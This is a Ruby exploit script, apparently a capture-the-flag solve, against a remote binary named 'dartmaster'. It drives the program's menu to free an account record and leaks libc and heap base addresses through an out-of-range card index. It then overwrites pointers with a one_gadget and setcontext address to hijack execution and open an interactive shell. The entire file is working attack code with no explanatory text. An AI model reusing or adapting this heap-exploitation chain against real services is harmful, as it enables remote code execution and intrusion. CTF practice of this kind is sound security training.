#!/usr/bin/env ruby
#encoding: ascii-8bit
require_relative '../zocket/zocket'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

$HOST, $PORT = '110.10.212.140', 5599
$local = false
($HOST = '0'; $local = true) if ARGV.empty?
$z = Zocket.new $HOST,$PORT, logger: HexLogger.new
def z;$z;end
$h = heapinfo('dartmaster')
def h;$h;end
#================= Exploit Start ====================

id = 'meow'
pass = 'pass'
z.puts "meow"
2.times { z.puts pass }
z.puts "information"

z.puts 2 # generate
z.puts "meow2"
2.times { z.puts pass }
z.puts "information2"

pass3 = 'P'
z.puts 2 # generate
z.puts "meow3"
2.times { z.puts pass3 }
z.puts "information3"


z.puts 3 # delete
z.puts "meow2"
z.puts pass

z.puts 1 # login
z.puts id
z.puts pass

z.puts 3 # manage
h.reload!

def leak(index)
  z.puts 3
  z.puts index
  z.puts 1
  z.gets '> Card ID : 0x'
  ([z.read(12)].pack("H*").reverse+"\x00\x00").u64
end

libc_base = leak(590) - 0x3c3b78
p "libc base @ 0x%x" % libc_base

heap_base = leak(1) - 0x12f70
p "heap base @ 0x%x" % heap_base

z.puts 5 # exit

z.puts 1 # pratice
z.gets "501\n", do_log: false
30.times do
  z.puts 50
  s = z.gets
  break if s.include? 'Over'
end

z.puts 2 # fight
10.times { z.puts 50 }
z.puts 1

z.puts 3
z.puts 4 # logout

z.puts 1
z.puts 'fakeid'

z.puts 2
name = 'o'
pass =  'pass'
z.puts name
2.times { z.puts pass }
z.puts 'infor'

rsp = heap_base + 0x18460
setcontext = libc_base + 0x47b75
magic = libc_base + OneGadget.gadgets(build_id: '60131540dadc6796cab33388349e6e4e68692053')[0] 

z.puts 2
z.puts "K" * 22
2.times { z.puts 'pass' }
z.puts 'infor'

z.puts 1
z.puts ('1' * 32 + rsp.p64 + magic.p64).ljust(70, '0')

z.puts 1 # login
z.puts name
z.puts pass

z.puts 1 # pratice
z.gets "501\n", do_log: false
30.times do
  z.puts 50
  s = z.gets
  break if s.include? 'Over'
end

z.puts 2 # fight
10.times { z.puts 50 }
z.puts 1
z.gets 'win',do_log: false
z.gets 'win',do_log: false

z.puts 3
z.puts 4 # logout

z.puts 3
z.puts name
z.puts ((heap_base+0x132e8).p64 + setcontext.p64).ljust(60, 'G')

z.puts 2

z.interact
